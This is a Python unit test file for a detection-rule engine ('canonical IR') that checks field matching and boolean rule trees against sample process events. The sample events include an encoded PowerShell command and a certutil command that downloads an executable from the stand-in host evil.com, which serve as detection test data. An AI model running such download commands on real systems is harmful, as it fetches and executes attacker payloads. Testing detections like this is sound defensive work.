"""
Unit Tests for Phase 2B Canonical Intermediate Representation (NIR) AST & Evaluator.
Verifies all atomic comparisons, boolean trees, regex, case handling, and evaluation performance.
"""
import pytest
from detection_content.canonical_ir import (
    BooleanLogicNode,
    BooleanOp,
    CanonicalIR,
    FieldCompareNode,
    NIREvaluator,
    Operator,
    ProvenanceInfo,
    TranslationFidelity,
)


def _make_dummy_ir(root_node, fidelity=TranslationFidelity.EXACT) -> CanonicalIR:
    prov = ProvenanceInfo(source="test", source_id="TEST-01", license="MIT")
    return CanonicalIR(
        content_id="TEST-IR-01",
        name="Test IR Rule",
        description="Testing NIR evaluation",
        tactic="Execution",
        technique_id="T1059",
        platform="windows",
        severity="high",
        confidence="high",
        lane="content",
        required_fields=["process.name", "process.command_line"],
        root_node=root_node,
        fidelity=fidelity,
        provenance=prov,
    )


def test_atomic_field_comparisons():
    ev = {
        "process": {
            "name": "powershell.exe",
            "command_line": "powershell.exe -NoP -enc SQBFAFgA...",
            "pid": 4096,
        },
        "network": {"src_ip": "10.0.0.1"},
    }

    # Equals
    node_eq = FieldCompareNode("process.name", Operator.EQUALS, "powershell.exe")
    assert node_eq.evaluate(ev) is True

    # Contains
    node_contains = FieldCompareNode("process.command_line", Operator.CONTAINS, "-enc")
    assert node_contains.evaluate(ev) is True

    # StartsWith
    node_sw = FieldCompareNode("process.command_line", Operator.STARTSWITH, "powershell.exe")
    assert node_sw.evaluate(ev) is True

    # EndsWith
    node_ew = FieldCompareNode("process.name", Operator.ENDSWITH, ".exe")
    assert node_ew.evaluate(ev) is True

    # Numeric Greater Than
    node_gt = FieldCompareNode("process.pid", Operator.GREATER_THAN, 1000)
    assert node_gt.evaluate(ev) is True

    # In Set
    node_in = FieldCompareNode("process.name", Operator.IN_SET, ["cmd.exe", "powershell.exe", "pwsh.exe"])
    assert node_in.evaluate(ev) is True


def test_boolean_logic_tree():
    ev = {
        "process": {
            "name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://evil.com/a.exe",
        }
    }

    # Condition: process.name == "certutil.exe" AND (command_line contains "-urlcache" AND command_line contains "http")
    c1 = FieldCompareNode("process.name", Operator.EQUALS, "certutil.exe")
    c2 = FieldCompareNode("process.command_line", Operator.CONTAINS, "-urlcache")
    c3 = FieldCompareNode("process.command_line", Operator.CONTAINS, "http")

    tree = BooleanLogicNode(BooleanOp.AND, [c1, c2, c3])
    ir = _make_dummy_ir(tree)

    assert ir.evaluate(ev) is True

    # Benign event
    benign_ev = {
        "process": {
            "name": "certutil.exe",
            "command_line": "certutil.exe -dump",
        }
    }
    assert ir.evaluate(benign_ev) is False


def test_nir_evaluator_metrics_and_unsupported():
    ev = {"process": {"name": "test.exe"}}
    node = FieldCompareNode("process.name", Operator.EQUALS, "test.exe")

    ir_ok = _make_dummy_ir(node, TranslationFidelity.EXACT)
    res_ok = NIREvaluator.evaluate(ir_ok, ev)
    assert res_ok.matched is True
    assert res_ok.execution_time_us >= 0.0

    # Fatal unsupported rule should refuse evaluation
    ir_unsupported = _make_dummy_ir(node, TranslationFidelity.UNSUPPORTED)
    res_un = NIREvaluator.evaluate(ir_unsupported, ev)
    assert res_un.matched is False
    assert "UNSUPPORTED" in res_un.error
